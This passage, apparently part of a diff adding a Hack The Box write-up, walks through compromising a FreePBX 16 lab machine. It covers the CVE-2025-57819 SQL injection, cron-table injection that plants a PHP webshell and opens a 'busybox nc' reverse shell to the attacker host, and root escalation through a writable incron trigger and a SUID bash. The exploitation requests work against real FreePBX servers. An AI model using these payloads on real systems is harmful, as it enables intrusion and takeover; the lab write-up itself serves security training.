+|   Not valid before: 2025-11-30T14:07:27
+|_  Not valid after:  2026-11-30T14:07:27
+|_http-title: <span class="error">400 Bad Request</span></code></pre>
+                </div>
+
+                <p>The scan reveals three open ports: <code>SSH</code> on 22, <code>HTTP</code> on 80, and <code>HTTPS</code> on 443. Port 80 redirects to <code>http://connected.htb/</code>, so I add the hostname to my <code>/etc/hosts</code> file for proper resolution.</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">echo</span> <span class="str">"10.129.17.43 connected.htb"</span> | <span class="cmd">sudo</span> <span class="cmd">tee</span> <span class="flag">-a</span> <span class="path">/etc/hosts</span></code></pre>
+                </div>
+
+                <h2>Web Enumeration - FreePBX</h2>
+                <p>Inspecting ports 80 and 443, I discover that the machine is running <strong>FreePBX version 16.0.40.7</strong> (<a href="https://github.com/freepbx">https://github.com/freepbx</a>). FreePBX is a popular open-source web interface for managing Asterisk telephony systems, widely used in enterprise environments.</p>
+
+                <h2>Vulnerability Research - CVE-2025-57819</h2>
+                <p>Researching this specific version of FreePBX, I discover it is affected by <a href="https://nvd.nist.gov/vuln/detail/cve-2025-57819">CVE-2025-57819</a>, an SQL injection vulnerability that allows executing arbitrary SQL queries without authentication. Under the right conditions, this SQLi can be escalated to remote code execution (RCE).</p>
+
+                <p>I find a PoC on GitHub (<a href="https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819">https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819</a>) and a detailed article from SANS ISC (<a href="https://isc.sans.edu/diary/32350">https://isc.sans.edu/diary/32350</a>), which explain both the vulnerability and the full exploitation chain.</p>
+
+                <h3>Confirming the SQL Injection</h3>
+                <p>The vulnerable endpoint is located at <code>/admin/ajax.php</code>, specifically in the endpoint module. The <code>brand</code> parameter is injectable. To confirm the vulnerability, I use the <code>EXTRACTVALUE</code> technique for error-based SQL injection:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">curl</span> <span class="flag">-i</span> <span class="flag">-k</span> <span class="str">"https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"</span></code></pre>
+                </div>
+
+                <p>The server response confirms the injection:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="http-header">HTTP/1.1</span> <span class="error">500 Internal Server Error</span>
+<span class="http-header">Server:</span> <span class="http-value">Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16</span>
+<span class="http-header">X-Powered-By:</span> <span class="http-value">PHP/7.4.16</span>
+<span class="http-header">Content-Type:</span> <span class="http-value">application/json</span>
+
+{<span class="str">"error"</span>:{<span class="str">"type"</span>:<span class="str">"Exception"</span>,<span class="str">"message"</span>:<span class="str">"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '<span class="success">~USER:freepbxuser@localhost~</span>'"</span>,<span class="str">"file"</span>:<span class="str">"\/var\/www\/html\/admin\/libraries\/utility.functions.php"</span>,<span class="str">"line"</span>:<span class="num">123</span>}}</code></pre>
+                </div>
+
+                <p>The MySQL user <code>freepbxuser@localhost</code> is clearly visible in the error response, confirming the SQL injection works.</p>
+
+                <h2>Initial Access - From SQLi to RCE via Cronjobs</h2>
+                <p>The SANS ISC article details a technique to turn this SQLi into RCE. FreePBX manages cronjobs through its database, via the <code>cron_jobs</code> table. By inserting a malicious record into this table, we can make FreePBX execute arbitrary commands when the cron fires.</p>
+
+                <h3>Article PoC</h3>
+                <p>The original PoC inserts a cronjob that creates a PHP file with a basic webshell:</p>
+
+                <div class="code-block">
+                    <span class="code-label">http</span>
+                    <pre><code><span class="kw">GET</span> <span class="path">/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x'</span> <span class="str">;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','takdak','echo "PD9waHAg..."|base64 -d >/var/www/html/rspgf.php',NULL,'* * * * *',30,1,1) --</span></code></pre>
+                </div>
+
+                <p>The base64 payload decodes to:</p>
+
+                <div class="code-block">
+                    <span class="code-label">php</span>
+                    <pre><code><span class="php-tag">&lt;?php</span> <span class="php-func">header</span>(<span class="php-str">'x_poc: CVE-2025-57819'</span>); <span class="php-kw">echo</span> <span class="php-func">shell_exec</span>(<span class="php-str">'uname -a'</span>); <span class="php-func">unlink</span>(<span class="php-var">__FILE__</span>); <span class="php-tag">?&gt;</span></code></pre>
+                </div>
+
+                <p>This creates a PHP webshell-like file that executes <code>uname -a</code> as a proof of concept. However, for our purposes we can use a more direct approach.</p>
+
+                <h3>Verifying RCE</h3>
+                <p>Before sending a reverse shell, I verify that the cronjob mechanism works by inserting a simple job that performs a <code>wget</code> to my machine:</p>
+
+                <div class="code-block">
+                    <span class="code-label">http</span>
+                    <pre><code><span class="kw">POST</span> <span class="path">/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','test','wget+10.10.15.180',NULL,'*+*+*+*+*',30,1,1)--+</span> <span class="str">HTTP/1.1</span></code></pre>
+                </div>
+
+                <p>The response is an expected error, since the injected query doesn't return valid data for the PHP view:</p>
+
+                <div class="code-block">
+                    <span class="code-label">json</span>
+                    <pre><code>{<span class="str">"error"</span>:{<span class="str">"type"</span>:<span class="str">"Whoops\\Exception\\ErrorException"</span>,<span class="str">"message"</span>:<span class="str">"Trying to access array offset on value of type bool"</span>,<span class="str">"file"</span>:<span class="str">"\/var\/www\/html\/admin\/modules\/endpoint\/views\/model.php"</span>,<span class="str">"line"</span>:<span class="num">144</span>}}</code></pre>
+                </div>
+
+                <p>This error is perfectly normal — the important thing is that the <code>INSERT</code> statement was executed in the database. I set up a listener on port 80 and after a short while I receive confirmation:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="ip">10.129.17.43</span> - - <span class="str">"GET / HTTP/1.1"</span> <span class="success">200</span> -</code></pre>
+                </div>
+
+                <p>It takes slightly longer than the expected minute from the cron interval (<code>* * * * *</code>), but it works. This confirms I have remote code execution.</p>
+
+                <h3>Getting a Reverse Shell</h3>
+                <p>Instead of creating a webshell, I opt to send myself a reverse shell directly using <code>busybox nc</code>:</p>
+
+                <div class="code-block">
+                    <span class="code-label">http</span>
+                    <pre><code><span class="kw">POST</span> <span class="path">/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','test2','busybox+nc+10.10.15.180+443+-e+sh',NULL,'*+*+*+*+*',30,1,1)--+</span> <span class="str">HTTP/1.1</span></code></pre>
+                </div>
+
+                <p>I set up a <code>netcat</code> listener and after a moment I receive the connection:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">sudo</span> <span class="cmd">nc</span> <span class="flag">-lvnp</span> <span class="num">443</span>
+listening on [any] <span class="num">443</span> ...
+connect to [<span class="ip">10.10.15.180</span>] from (UNKNOWN) [<span class="ip">10.129.17.43</span>] <span class="num">47916</span>
+bash: no job control in this shell
+
+  ______              ______ ______  __   __
+ |  _____|           |  ___ \|  ___ \\ \ / /
+ | |_  _ __  ___  ___| |_/ /| |_/ / \ V /
+ | _| | '__|/ _ \/ _ \  __/ |  ___ \ / \
+ | |  | |  |  __/|  __/| |  | |_/ // /^\ \
+ \_|  |_|   \___| \___|\_ | \____/ \/   \/
+
+NOTICE! You have 3 notifications! Please log into the UI to see them!
+
+Current Network Configuration
++-----------+-------------------+---------------------------+
+| Interface | MAC Address       | IP Addresses              |
++-----------+-------------------+---------------------------+
+| eth0      | A2:DE:AD:BB:B6:54 | <span class="ip">10.129.17.43</span>              |
+|           |                   | fe80::82bd:1bcb:a990:dd3b |
++-----------+-------------------+---------------------------+
+
+<span class="user">[asterisk@connected ~]$</span></code></pre>
+                </div>
+
+                <p>I have access as the <code>asterisk</code> user. The TTY behaves somewhat oddly, so to make life easier I add my public SSH key to <code>.ssh/authorized_keys</code> and establish persistence through SSH.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>Once inside, I enumerate the services running locally. With <code>ps</code> I observe that root is running a Python web application:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="user">root</span> <span class="num">1368</span> 0.0 0.8 267684 35240 ? S 11:08 0:01 <span class="cmd">/usr/bin/python3.6</span> <span class="flag">-m</span> aiohttp.web aiovega.web:app_factory <span class="flag">-H</span> <span class="ip">127.0.0.1</span> <span class="flag">-P</span> <span class="num">4000</span></code></pre>
+                </div>
+
+                <p>There are also several ports open internally:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code>tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">27017</span>  0.0.0.0:*  LISTEN   <span class="comment"># MongoDB</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">3306</span>   0.0.0.0:*  LISTEN   <span class="comment"># MySQL</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">6379</span>   0.0.0.0:*  LISTEN   <span class="comment"># Redis</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">5038</span>   0.0.0.0:*  LISTEN   <span class="comment"># Asterisk AMI</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">25</span>     0.0.0.0:*  LISTEN   <span class="comment"># SMTP</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">4000</span>   0.0.0.0:*             <span class="comment"># aiohttp app</span></code></pre>
+                </div>
+
+                <p>I investigate the service on port 4000, which seems to be some kind of proxy:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">curl</span> localhost:<span class="num">4000</span>
+{<span class="str">"status"</span>: <span class="num">400</span>, <span class="str">"message"</span>: <span class="str">"Vega to proxy to isn't specified"</span>}</code></pre>
+                </div>
+
+                <p>I investigated this service a bit more but ended up at a dead end with nothing exploitable.</p>
+
+                <h2>Privilege Escalation - Incron Abuse</h2>
+                <p>Analyzing automated tasks, crons, and other recurring processes, I discover the <code>incrond</code> service running as root:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="user">root</span> <span class="num">754</span> 0.0 0.0 15044 1120 ? Ss 11:08 0:00 <span class="cmd">/usr/sbin/incrond</span></code></pre>
+                </div>
+
+                <p><code>incron</code> is a daemon similar to <code>cron</code>, but instead of executing tasks based on time, it triggers them when filesystem events are detected (via <code>inotify</code>). In other words, it monitors changes on files and directories and runs commands when they occur.</p>
+
+                <h3>Analyzing Incron Triggers</h3>
+                <p>I examine the <code>incron</code> configuration to see which files it monitors:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">cat</span> <span class="path">/etc/incron.d/legacy</span>
+<span class="path">/var/spool/asterisk/sysadmin/vpnget</span>                    <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_openvpn -d</span>
+<span class="path">/var/spool/asterisk/sysadmin/intrusion_detection_stop</span>   <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/etc/init.d/fail2ban stop</span>
+<span class="path">/var/spool/asterisk/sysadmin/update_system_cron</span>         <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_update_set_cron</span>
+<span class="path">/var/spool/asterisk/sysadmin/portmgmt_setup</span>             <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_portmgmt</span>
+<span class="path">/var/spool/asterisk/sysadmin/wanrouter_restart</span>          <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_wanrouter_restart</span>
+<span class="path">/var/spool/asterisk/sysadmin/dahdi_restart</span>              <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_dahdi_restart</span>
+<span class="path">/usr/local/asterisk/ha_trigger</span>                          <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_ha</span></code></pre>
+                </div>
+
+                <p>Each line defines: a file to monitor, an event (<code>IN_CLOSE_WRITE</code> = a file is closed after being written to), and a command to execute when the event is detected. All these commands run as <strong>root</strong>, since <code>incrond</code> runs as root.</p>
+
+                <h3>Identifying the Attack Vector</h3>
+                <p>I check the permissions on the <code>ha_trigger</code> file:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">ls</span> <span class="flag">-lah</span> <span class="path">/usr/local/asterisk/ha_trigger</span>
+<span class="success">-rwxrwxrwx.</span> 1 asterisk asterisk 0 Jun 7 15:44 <span class="path">/usr/local/asterisk/ha_trigger</span></code></pre>
+                </div>
+
+                <p>The file has <code>rwxrwxrwx</code> permissions — any user can write to it! This means I can trigger the <code>IN_CLOSE_WRITE</code> event simply by writing to this file, which will cause <code>incrond</code> to execute <code>/usr/sbin/sysadmin_ha</code> as root.</p>
+
+                <h3>Analyzing the sysadmin_ha Script</h3>
+                <p>Let's see what the triggered script does:</p>
+
+                <div class="code-block">
+                    <span class="code-label">php</span>
+                    <pre><code><span class="php-tag">#!/usr/bin/php -q</span>
+<span class="php-tag">&lt;?php</span>
+
+<span class="php-kw">if</span>(<span class="php-func">file_exists</span>(<span class="php-str">"/var/www/html/admin/modules/freepbx_ha/license.php"</span>)) {
+    <span class="php-func">include_once</span>(<span class="php-str">"/var/www/html/admin/modules/freepbx_ha/license.php"</span>);
+}
+
+<span class="php-var">$i</span> = <span class="php-str">"/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php"</span>;
+<span class="php-kw">if</span> (<span class="php-func">file_exists</span>(<span class="php-var">$i</span>)) {
+    <span class="php-func">require_once</span>(<span class="php-var">$i</span>);
+    <span class="php-var">$incron</span> = <span class="php-kw">new</span> <span class="php-class">incron</span>;
+    <span class="php-var">$incron</span>-><span class="php-func">rootTrigger</span>();
+}</code></pre>
+                </div>
+
+                <p>This PHP script is very interesting. It attempts to include the file <code>/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php</code> and, if it exists, instantiates the <code>incron</code> class and calls the <code>rootTrigger()</code> method. All of this runs as <strong>root</strong> thanks to <code>incrond</code>.</p>
+
+                <h3>Crafting the PHP Payload</h3>
+                <p>The key insight is that the path <code>/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php</code> <strong>doesn't exist on the system</strong>, but the directory <code>/var/www/html/admin/modules/</code> belongs to our <code>asterisk</code> user, so we can create the entire directory structure and PHP file as we wish.</p>
+
+                <p>I create the necessary directory structure and the <code>incron.php</code> file with a malicious class:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">mkdir</span> <span class="flag">-p</span> <span class="path">/var/www/html/admin/modules/freepbx_ha/functions.inc/</span></code></pre>
+                </div>
+
+                <p>And write the PHP file content:</p>
+
+                <div class="code-block">
+                    <span class="code-label">php</span>
+                    <pre><code><span class="php-tag">&lt;?php</span>
+
+<span class="php-kw">class</span> <span class="php-class">incron</span> {
+    <span class="php-kw">public function</span> <span class="php-func">rootTrigger</span>() {
+        <span class="php-func">shell_exec</span>(<span class="php-str">'chmod +s /bin/bash'</span>);
+    }
+}</code></pre>
+                </div>
+
+                <p>This class defines the <code>rootTrigger()</code> method that the <code>sysadmin_ha</code> script will invoke. The <code>chmod +s /bin/bash</code> command sets the SUID bit on <code>/bin/bash</code>, which will allow us to run bash as root.</p>
+
+                <h3>Firing the Trigger</h3>
+                <p>With everything in place, all that's left is to write to the monitored file so that <code>incrond</code> fires the chain:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">touch</span> <span class="path">/usr/local/asterisk/ha_trigger</span></code></pre>
+                </div>
+
+                <p>The <code>touch</code> command writes to the file (updates its timestamp), which generates the <code>IN_CLOSE_WRITE</code> event. This causes <code>incrond</code> to execute <code>/usr/sbin/sysadmin_ha</code> as root, which includes our malicious <code>incron.php</code> and calls <code>rootTrigger()</code>, setting the SUID bit on <code>/bin/bash</code>.</p>
+
+                <p>I verify it worked:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">ls</span> <span class="flag">-la</span> <span class="path">/bin/bash</span>
+<span class="error">-rwsr-sr-x.</span> 1 root root 964536 Apr  1  2020 <span class="path">/bin/bash</span></code></pre>
+                </div>
+
+                <p>The SUID bit (<code>s</code>) is set! Now I run <code>bash -p</code> to obtain a root shell, getting the system flag and completing the machine.</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">bash</span> <span class="flag">-p</span>
+<span class="user">[root@connected ~]#</span> <span class="cmd">whoami</span>
+<span class="success">root</span></code></pre>
+                </div>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
